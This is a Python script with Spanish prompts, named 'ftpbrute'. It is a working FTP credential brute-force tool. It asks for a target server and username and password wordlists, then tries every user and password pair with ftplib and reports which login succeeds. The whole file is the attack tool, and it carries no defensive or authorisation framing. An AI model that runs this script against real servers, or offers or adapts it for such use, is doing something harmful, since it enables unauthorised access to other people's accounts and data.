from ftplib import FTP, error_perm, error_reply, error_temp

def menu():
    global selec

    print("""
[01] Usuario multiple 
[02] Usuario unico
[03] Salir
""")
    try:
        selec=int(input("ftpbrute->> "))

        while selec > 3 or selec < 1:

            selec=int(input("ftpbrute->> "))

    except:
        exit(0)


def entradas():

    global usuario, password, ftpserver
    
    try:

        ftpserver=input("Introduce el url de inicio de sesion FTP: ")

        if selec == 1:
            usuario=input("Introduce la ruta del diccionario de usuarios: ")
        else:
            usuario=input("Introduce el nombre de usuario FTP: ")

        password=input("Introduce la ruta del diccionario de contraseñas: ")

        while len(usuario) <= 0 or len(password) <= 0:

            if selec == 1:
                usuario=input("Introduce la ruta del diccionario de usuarios: ")
            else:
                usuario=input("Introduce el nombre de usuario FTP: ")

            password=input("Introduce la ruta del diccionario de contraseñas: ")

    except:
        exit(0)

def limpieza():

    if selec == 1:

        usuarios=open(usuario)
        lec_usuarios=usuarios.read()

        if " " in lec_usuarios:
            lec_usuarios=lec_usuarios.replace(" ","\n")

        usu_save=open(".tempusu", "w")
        usu_save.write(lec_usuarios)

        usu_save.close()
        usuarios.close()

    passw=open(password)
    pass_lec=passw.read()

    if " " in pass_lec:
        pass_lec=pass_lec.replace(" ", "\n")
    
    pass_save=open(".temppass", "w")
    pass_save.write(pass_lec)

    pass_save.close()
    passw.close()

def vector(usuario,password,ftpserver):

    try:
        with FTP(ftpserver) as conect:
            conect.login(user=usuario, passwd=password)
    #conect.login(user=usuario,passwd=password) # TimeoutError

    except TimeoutError:
        print(f"[OUT] SERVIDOR NO RESPONDE EN ->> [U]-{usuario}-[P]-{password}")
    except (error_temp, error_perm, error_reply):
        print(f"[BAD] USUARIO Y CONTRASEÑA INVALIDO ->> [U]-{usuario}-[P]-{password}")
    except:
        print("[ERR] ALGO SUCEDIO X_X")
        exit(0)
    else:
        print(f"[GET] USUARIO Y CONTRASEÑA CORRECTOS ->> [U]-{usuario}-[P]-{password}")
        pausa=input("Presiona enter para continuar...")
        exit(0)


def ataque():

    global usuario, ftpserver

    password_lines=open(".temppass")
    lines_pass=password_lines.readlines()

    if selec == 1:
        usuario_lec=open(".tempusu")
        lines=usuario_lec.readlines()

        for usuario in lines:
            usuario=usuario.replace("\n","")
            for password in lines_pass:

                password=password.replace("\n","")
                vector(usuario,password,ftpserver)

    if selec == 2:

        for password in lines_pass:

            password=password.replace("\n","")
            vector(usuario,password,ftpserver)
            



######################################################################################

#try:
menu()

if selec == 1 or selec == 2:
    entradas()
    limpieza()
    print(f"[FTP] EMPEZANDO ATAQUE EN ->> {ftpserver}")
    ataque()

if selec == 3:
    exit(0)

#except:
#exit(0)